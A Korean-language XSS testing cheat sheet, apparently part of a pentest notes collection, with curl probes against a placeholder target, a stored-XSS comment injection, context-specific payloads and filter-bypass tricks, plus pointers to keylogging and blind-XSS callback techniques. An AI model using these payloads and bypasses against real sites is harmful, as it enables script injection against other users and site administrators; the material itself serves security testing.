# XSS — 크로스 사이트 스크립팅

- XSS(Cross-Site Scripting) — 사용자 입력이 응답 HTML·JS 컨텍스트에 검증 없이 삽입되어 브라우저에서 코드가 실행되는 취약점. 반사형(reflected)·저장형(stored)·DOM 기반 세 종류가 있다.
- 검색·댓글·닉네임·메시지처럼 입력이 페이지에 다시 나타나는 지점마다 페이로드를 넣어 실행 여부를 확인할 때. 저장형 XSS는 다른 사용자 브라우저에서도 실행되므로 영향도가 가장 크다.
- 입력 지점과 컨텍스트(HTML 태그 내부·속성 값·JS 문자열)를 구분해야 한다. 컨텍스트에 따라 유효한 페이로드가 완전히 달라진다.

## 취약한 컨텍스트 판별

```bash
# 반사 여부 확인 — 마커 문자열이 응답에 그대로 나오는지
curl -s "http://target.com/search?q=XXSSTEST" | grep XXSSTEST
# 특수문자 필터 여부 확인
curl -s "http://target.com/search?q=%3Cscript%3E" | grep -i script
```

- 마커가 응답에 그대로 나오면 반사형 후보. `<script>`가 그대로 남아 있으면 필터가 없다는 뜻이다.

## 기본 테스트 페이로드

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

- `<script>`가 차단돼도 이벤트 핸들러(onerror·onload·ontoggle) 방식이 통하는 경우가 많다. 위 목록을 순서대로 시험한다.

## 저장형 XSS 테스트

```bash
# 댓글·프로필 등 저장되는 필드에 페이로드 삽입
curl -X POST http://target.com/comment -d "comment=<img src=x onerror=alert(1)>&post_id=1"
```

- 저장형 판정: 삽입 후 페이지(또는 다른 사용자가 보는 페이지)를 다시 열 때마다 실행된다. 댓글 목록·관리자 대시보드 같은 "다른 사람이 보는 화면"이 실행 지점이 된다.

## 컨텍스트별 페이로드

```text
HTML 본문 컨텍스트 (태그 사이)
  <script>alert(1)</script>
HTML 속성 값 컨텍스트 (value="...")
  " onfocus=alert(1) autofocus=
  '><img src=x onerror=alert(1)>
JS 문자열 컨텍스트 (var x = "...")
  ";alert(1)//
URL/href 컨텍스트
  javascript:alert(1)
```

- 컨텍스트 파악이 핵심이다. value="..." 안에서 <script>는 아무 효과가 없고, 따옴표를 닫고 이벤트 핸들러를 열어야 한다.

## 우회 팁

```text
<script> 차단      -> <img src=x onerror=...>, <svg onload=...>
alert 차단         -> confirm(1), prompt(1), throw
공백 차단          -> 탭(%09), 개행(%0a), 슬래시(<svg/onload=...)
대문자 필터        -> <ScRiPt> 혼용 (HTML은 대소문자 무시)
```

- 자동화는 dalfox를 쓴다 → web/xss/dalfox.md. 파라미터 퍼징은 ffuf(POST 퍼징 포함)로 입력 지점을 먼저 찾는다.

## 트러블슈팅

- 페이로드가 소스에는 있지만 실행이 안 되면 컨텍스트가 틀린 것이다. 브라우저 개발자 도구로 삽입된 위치가 태그인지 속성인지 확인한다.
- `<script>`가 `<scr%ipt>`처럼 변형되어 나오면 필터가 치환하고 있다. 인코딩·대소문자·중첩으로 우회를 시험한다.
- httponly 쿠키면 쿠키 탈취는 안 되지만 키로깅·요청 위조(피싱)로 영향을 입증한다 → web/xss/xss_phishing.md, xss_exfiltration.md
- 블라인드 XSS(관리자만 보는 지점)는 콜백 리스너로 확인한다 → web/xss/javascript_blind_xss.md, xss_listener.md
- 실습·심화: web/xss/xss.md (기본 실습), xss_reconnaissance.md (입력 지점 탐색), xss.md 실습 시리즈
